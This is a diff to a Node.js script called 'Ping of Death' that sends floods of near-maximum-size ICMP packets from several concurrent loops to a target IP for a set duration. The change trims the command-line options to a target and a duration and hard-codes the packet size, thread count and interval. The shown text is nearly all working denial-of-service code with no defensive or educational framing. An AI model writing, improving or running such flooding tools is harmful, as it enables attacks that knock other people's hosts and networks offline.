@@ -1,15 +1,17 @@
 const raw = require('raw-socket');
 
-if (process.argv.length < 6) {
-    console.log('Usage: node PING-OF-DEATH.js <host-target> <size(byte)> <threads> <interval(ms)> <time(s)>');
+if (process.argv.length < 4) {
+    console.log('Usage: ping.js <ip> <duration>');
     process.exit(1);
 }
 
 const target = process.argv[2];
-const packetSize = parseInt(process.argv[3]);
-const threads = parseInt(process.argv[4]);
-const interval = parseFloat(process.argv[5]);
-const time = parseInt(process.argv[6]) * 1000; // Convert to milliseconds
+const duration = parseInt(process.argv[3]) * 1000; // Convert duration to milliseconds
+
+// Default values for packet size, threads, and interval
+const packetSize = 65500; // Default packet size
+const threads = 10; // Default number of threads
+const interval = 10; // Default interval in milliseconds
 
 // Maximum ICMP packet size including headers is 65535 bytes, but the actual payload size must be smaller
 const MAX_PAYLOAD_SIZE = 65507; // 65535 - 20 (IP header) - 8 (ICMP header)
@@ -73,24 +75,23 @@ const sendPing = () => {
 
     setTimeout(() => {
         socket.close();
-    }, time);
+    }, duration);
 };
 
 const startFlood = () => {
     for (let i = 0; i < threads; i++) {
         const flood = () => {
             sendPing();
-            setImmediate(flood);
+            setTimeout(flood, interval);
         };
         setImmediate(flood);
     }
 };
 
-console.log(`Starting Ping of Death to ${target} with packet size ${packetSize} bytes, ${threads} threads, interval ${interval} ms for ${time / 1000} seconds`);
+console.log(`Starting Ping of Death to ${target} with packet size ${packetSize} bytes, ${threads} threads, interval ${interval} ms for ${duration / 1000} seconds`);
 startFlood();
 
 setTimeout(() => {
     console.log('Stopping Ping of Death');
     process.exit(0);
-}, time);
-
+}, duration);
